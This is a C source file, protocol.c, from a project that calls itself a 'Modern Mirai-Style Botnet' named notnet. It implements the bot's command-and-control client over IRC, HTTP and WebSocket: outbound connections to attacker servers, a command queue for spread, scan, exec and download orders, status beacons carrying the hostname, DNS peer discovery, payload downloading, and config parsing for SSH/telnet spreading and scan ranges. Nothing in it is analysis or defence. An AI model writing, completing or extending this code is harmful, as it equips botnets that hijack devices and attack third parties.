/*
 * notnet - Modern Mirai-Style Botnet
 * protocol.c - C2 protocol implementation (IRC, HTTP, WebSocket)
 */
#include "protocol.h"
#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <stdarg.h>

/* ── IRC Implementation ───────────────────────────────────────── */
static int irc_create_socket(notnet_bot_t *bot) {
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        log_error("IRC: socket() failed: %s", strerror(errno));
        return -1;
    }
    
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bot->c2_irc.port);
    
    /* Resolve server */
    struct hostent *he = gethostbyname(bot->c2_irc.server);
    if (!he) {
        log_error("IRC: DNS resolution failed for %s", bot->c2_irc.server);
        close(sock);
        return -1;
    }
    
    memcpy(&addr.sin_addr, he->h_addr, he->h_length);
    
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        log_error("IRC: connect() failed: %s", strerror(errno));
        close(sock);
        return -1;
    }
    
    return sock;
}

int irc_connect(notnet_bot_t *bot) {
    if (bot->c2_irc.connected) return 0;
    
    int sock = irc_create_socket(bot);
    if (sock < 0) return -1;
    
    bot->c2_irc.sock = sock;
    bot->c2_irc.connected = 1;
    bot->c2_irc.last_ping = time(NULL);
    
    log_info("IRC: connected to %s:%d", bot->c2_irc.server, bot->c2_irc.port);
    
    /* Send NICK and USER */
    irc_send(bot, "NICK %s%d", IRC_NICK_PREFIX, rand() % 1000);
    irc_send(bot, "USER %s 0 * :notnet bot", IRC_NICK_PREFIX);
    
    return 0;
}

int irc_send(notnet_bot_t *bot, const char *format, ...) {
    if (!bot->c2_irc.connected) return -1;
    
    char buf[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buf, sizeof(buf), format, args);
    va_end(args);
    
    /* Ensure IRC protocol termination */
    char full_cmd[512];
    snprintf(full_cmd, sizeof(full_cmd), "%s\r\n", buf);
    
    int sent = send(bot->c2_irc.sock, full_cmd, strlen(full_cmd), 0);
    if (sent < 0) {
        log_error("IRC: send() failed: %s", strerror(errno));
        return -1;
    }
    
    return sent;
}

int irc_read(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_irc.connected) return -1;
    
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(bot->c2_irc.sock, &fds);
    tv.tv_sec = 0;
    tv.tv_usec = 0;
    
    if (select(bot->c2_irc.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
    
    int received = recv(bot->c2_irc.sock, buf, len, 0);
    if (received <= 0) {
        log_info("IRC: connection closed");
        bot->c2_irc.connected = 0;
        close(bot->c2_irc.sock);
        bot->c2_irc.sock = -1;
        return -1;
    }
    
    /* Process IRC response */
    buf[received] = '\0';
    
    /* Check for PING */
    if (strstr(buf, "PING")) {
        char host[256];
        sscanf(buf, "PING :%s", host);
        irc_send(bot, "PONG :%s", host);
        log_debug("IRC: ponged %s", host);
    }
    
    /* Check for JOIN confirmation */
    if (strstr(buf, "366")) {
        log_info("IRC: joined channel %s", bot->c2_irc.channel);
        bot->c2_irc.authenticated = 1;
    }
    
    /* Process PRIVMSG commands */
    char *privmsg = strstr(buf, ":");
    if (privmsg && strstr(privmsg, "PRIVMSG")) {
        char *cmd_start = strchr(privmsg, ':');
        if (cmd_start) {
            cmd_start++; /* skip the colon */
            /* Parse command */
            char cmd[256];
            snprintf(cmd, sizeof(cmd), "%s", cmd_start);
            log_info("IRC: command: %s", cmd);
            return 1; /* signal new command */
        }
    }
    
    return 0;
}

void irc_disconnect(notnet_bot_t *bot) {
    if (bot->c2_irc.connected) {
        bot->c2_irc.connected = 0;
        if (bot->c2_irc.sock >= 0) {
            close(bot->c2_irc.sock);
            bot->c2_irc.sock = -1;
        }
        log_info("IRC: disconnected");
    }
}

/* ── HTTP Implementation ───────────────────────────────────────── */
int http_connect(notnet_bot_t *bot) {
    if (bot->c2_http.connected) return 0;
    
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bot->c2_http.port);
    
    struct hostent *he = gethostbyname(bot->c2_http.server);
    if (!he) {
        close(sock);
        return -1;
    }
    
    memcpy(&addr.sin_addr, he->h_addr, he->h_length);
    
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    
    bot->c2_http.sock = sock;
    bot->c2_http.connected = 1;
    return 0;
}

int http_post(notnet_bot_t *bot, const char *data, int len) {
    if (!bot->c2_http.connected) return -1;
    
    char headers[512];
    snprintf(headers, sizeof(headers),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: application/json\r\n"
        "User-Agent: %s\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n",
        bot->c2_http.path, bot->c2_http.server, bot->c2_http.user_agent, len);
    
    send(bot->c2_http.sock, headers, strlen(headers), 0);
    send(bot->c2_http.sock, data, len, 0);
    
    return 0;
}

int http_get(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_http.connected) return -1;
    
    char req[512];
    snprintf(req, sizeof(req),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Connection: close\r\n"
        "\r\n",
        bot->c2_http.path, bot->c2_http.server, bot->c2_http.user_agent);
    
    send(bot->c2_http.sock, req, strlen(req), 0);
    
    /* Read response */
    int total = 0;
    while (total < len - 1) {
        int received = recv(bot->c2_http.sock, buf + total, len - total - 1, 0);
        if (received <= 0) break;
        total += received;
    }
    buf[total] = '\0';
    
    return total;
}

int http_download(notnet_bot_t *bot, const char *url, const char *dest) {
    char buf[PAYLOAD_MAX_SIZE];
    int len = http_get(bot, buf, sizeof(buf));
    if (len <= 0) return -1;
    
    /* Simple HTTP response parsing - skip headers */
    char *body = strstr(buf, "\r\n\r\n");
    if (!body) return -1;
    body += 4;
    int body_len = len - (body - buf);
    
    FILE *f = fopen(dest, "wb");
    if (!f) return -1;
    fwrite(body, 1, body_len, f);
    fclose(f);
    
    return body_len;
}

void http_disconnect(notnet_bot_t *bot) {
    if (bot->c2_http.connected) {
        bot->c2_http.connected = 0;
        if (bot->c2_http.sock >= 0) {
            close(bot->c2_http.sock);
            bot->c2_http.sock = -1;
        }
        log_info("HTTP: disconnected");
    }
}

/* ── WebSocket Implementation ─────────────────────────────────────── */
int ws_connect(notnet_bot_t *bot) {
    if (bot->c2_ws.connected) return 0;
    
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bot->c2_ws.port);
    
    struct hostent *he = gethostbyname(bot->c2_ws.server);
    if (!he) {
        close(sock);
        return -1;
    }
    
    memcpy(&addr.sin_addr, he->h_addr, he->h_length);
    
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    
    bot->c2_ws.sock = sock;
    bot->c2_ws.connected = 1;
    log_info("WS: connected to %s:%d", bot->c2_ws.server, bot->c2_ws.port);
    
    return 0;
}

int ws_send(notnet_bot_t *bot, const char *data, int len) {
    if (!bot->c2_ws.connected) return -1;
    /* Simple WebSocket framing - send raw data for now */
    return send(bot->c2_ws.sock, data, len, 0);
}

int ws_read(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_ws.connected) return -1;
    
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(bot->c2_ws.sock, &fds);
    tv.tv_sec = 0;
    tv.tv_usec = 0;
    
    if (select(bot->c2_ws.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
    
    int received = recv(bot->c2_ws.sock, buf, len, 0);
    if (received <= 0) {
        bot->c2_ws.connected = 0;
        close(bot->c2_ws.sock);
        bot->c2_ws.sock = -1;
        return -1;
    }
    
    buf[received] = '\0';
    return received;
}

void ws_disconnect(notnet_bot_t *bot) {
    if (bot->c2_ws.connected) {
        bot->c2_ws.connected = 0;
        if (bot->c2_ws.sock >= 0) {
            close(bot->c2_ws.sock);
            bot->c2_ws.sock = -1;
        }
        log_info("WS: disconnected");
    }
}

/* ── Core Protocol ──────────────────────────────────────────── */
int protocol_connect_all(notnet_bot_t *bot) {
    /* Try IRC first (fast, lightweight) */
    if (bot->c2_enabled & C2_IRC) {
        if (!bot->c2_irc.connected) {
            if (irc_connect(bot) == 0) {
                irc_send(bot, "JOIN %s", bot->c2_irc.channel);
            }
        }
    }
    
    /* Try HTTP if IRC fails */
    if (bot->c2_enabled & C2_HTTP) {
        if (!bot->c2_http.connected) {
            http_connect(bot);
        }
    }
    
    /* Try WebSocket as backup */
    if (bot->c2_enabled & C2_WS) {
        if (!bot->c2_ws.connected) {
            ws_connect(bot);
        }
    }
    
    return 0;
}

int protocol_process_commands(notnet_bot_t *bot) {
    char buf[1024];
    
    /* Check IRC */
    if (bot->c2_irc.connected && bot->c2_irc.authenticated) {
        int result = irc_read(bot, buf, sizeof(buf));
        if (result == 1) {
            /* New command in buffer - add to queue */
            if (bot->cmd_count < 256) {
                snprintf(bot->cmd_queue[bot->cmd_count], 255, "%s", buf);
                bot->cmd_count++;
            }
        }
    }
    
    /* Check HTTP */
    if (bot->c2_http.connected) {
        /* Poll for commands via HTTP */
    }
    
    /* Check WebSocket */
    if (bot->c2_ws.connected) {
        int result = ws_read(bot, buf, sizeof(buf));
        if (result > 0) {
            if (bot->cmd_count < 256) {
                snprintf(bot->cmd_queue[bot->cmd_count], 255, "%s", buf);
                bot->cmd_count++;
            }
        }
    }
    
    /* Process queued commands */
    for (int i = 0; i < bot->cmd_count; i++) {
        char *cmd = bot->cmd_queue[i];
        
        if (strncmp(cmd, CMD_SPREAD, strlen(CMD_SPREAD)) == 0) {
            log_info("CMD: spread");
        } else if (strncmp(cmd, CMD_SCAN, strlen(CMD_SCAN)) == 0) {
            log_info("CMD: scan");
        } else if (strncmp(cmd, CMD_EXEC, strlen(CMD_EXEC)) == 0) {
            log_info("CMD: exec: %s", cmd + strlen(CMD_EXEC));
        } else if (strncmp(cmd, CMD_DOWNLOAD, strlen(CMD_DOWNLOAD)) == 0) {
            log_info("CMD: download");
        } else if (strncmp(cmd, CMD_UPDATE, strlen(CMD_UPDATE)) == 0) {
            log_info("CMD: update");
        } else if (strncmp(cmd, CMD_REBOOT, strlen(CMD_REBOOT)) == 0) {
            log_info("CMD: reboot");
        } else if (strncmp(cmd, CMD_SLEEP, strlen(CMD_SLEEP)) == 0) {
            char *interval = strchr(cmd, ' ');
            if (interval) {
                bot->scan_interval = atoi(interval + 1);
                log_info("CMD: sleep interval set to %d", bot->scan_interval);
            }
        } else if (strncmp(cmd, CMD_CONFIG_SET, strlen(CMD_CONFIG_SET)) == 0) {
            log_info("CMD: config_set: %s", cmd + strlen(CMD_CONFIG_SET));
        }
    }
    
    /* Clear processed commands */
    bot->cmd_count = 0;
    
    return 0;
}

int protocol_send_heartbeat(notnet_bot_t *bot) {
    char heartbeat[512];
    snprintf(heartbeat, sizeof(heartbeat),
        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u}",
        NOTNET_VERSION, bot->hostname, (long)(time(NULL) - bot->uptime), bot->scan_count);
    
    /* Send via IRC */
    if (bot->c2_irc.connected && bot->c2_irc.authenticated) {
        irc_send(bot, "PRIVMSG %s :%s", bot->c2_irc.channel, heartbeat);
    }
    
    /* Send via HTTP */
    if (bot->c2_http.connected) {
        http_post(bot, heartbeat, strlen(heartbeat));
    }
    
    /* Send via WebSocket */
    if (bot->c2_ws.connected) {
        ws_send(bot, heartbeat, strlen(heartbeat));
    }
    
    return 0;
}

int protocol_resolve_peers(notnet_bot_t *bot) {
    /* DNS enumeration for peer discovery */
    struct hostent *he = gethostbyname(DNS_PEER_RESOLUTION);
    if (!he) return -1;
    
    bot->peer_count = 0;
    for (int i = 0; he->h_addr_list[i] && bot->peer_count < PEER_CACHE_SIZE; i++) {
        char *ip = inet_ntoa(*(struct in_addr *)he->h_addr_list[i]);
        if (ip) {
            strncpy(bot->peer_cache[bot->peer_count], ip, 255);
            bot->peer_count++;
        }
    }
    
    log_info("DNS: resolved %d peers for %s", bot->peer_count, DNS_PEER_RESOLUTION);
    return 0;
}

int protocol_resolve_host(const char *host) {
    struct hostent *he = gethostbyname(host);
    if (!he) return -1;
    
    struct in_addr *addr = (struct in_addr *)he->h_addr;
    if (!addr) return -1;
    
    return inet_addr(inet_ntoa(*addr));
}

char *protocol_hex_encode(const char *data, int len) {
    static char buf[1024];
    int pos = 0;
    
    for (int i = 0; i < len && pos < 1023; i++) {
        pos += snprintf(buf + pos, 3, "%02x", (unsigned char)data[i]);
    }
    
    buf[pos] = '\0';
    return buf;
}

/* ── Config Loading ──────────────────────────────────────────── */
int load_config(notnet_bot_t *bot, const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) {
        log_info("No config file at %s, using defaults", path);
        return -1;
    }
    
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        /* Remove newline */
        line[strcspn(line, "\n")] = '\0';
        
        /* Skip comments and empty lines */
        if (line[0] == '#' || line[0] == '\0') continue;
        
        /* Parse key=value */
        char *eq = strchr(line, '=');
        if (!eq) continue;
        *eq = '\0';
        
        char *key = line;
        char *value = eq + 1;
        
        if (strcmp(key, "irc_server") == 0) {
            strncpy(bot->c2_irc.server, value, 255);
        } else if (strcmp(key, "irc_port") == 0) {
            bot->c2_irc.port = atoi(value);
        } else if (strcmp(key, "http_server") == 0) {
            strncpy(bot->c2_http.server, value, 255);
        } else if (strcmp(key, "http_port") == 0) {
            bot->c2_http.port = atoi(value);
        } else if (strcmp(key, "scan_interval") == 0) {
            bot->scan_interval = atoi(value);
        } else if (strcmp(key, "ssh_enabled") == 0) {
            bot->ssh_enabled = atoi(value);
        } else if (strcmp(key, "telnet_enabled") == 0) {
            bot->telnet_enabled = atoi(value);
        } else if (strcmp(key, "scan_targets") == 0) {
            /* Format: "192.168.1.0/24,10.0.0.0/24" or one per line with prefix "scan_target_X" */
            if (bot->scan_target_count < 16) {
                strncpy(bot->scan_targets[bot->scan_target_count], value, 255);
                bot->scan_target_count++;
            }
        } else if (strncmp(key, "scan_target_", 12) == 0) {
            /* Legacy: scan_target_0, scan_target_1, etc. */
            int idx = atoi(key + 12);
            if (idx >= 0 && idx < 16 && bot->scan_target_count <= idx) {
                bot->scan_target_count = idx + 1;
                strncpy(bot->scan_targets[idx], value, 255);
            }
        }
    }
    
    fclose(f);
    log_info("Config loaded from %s", path);
    return 0;
}
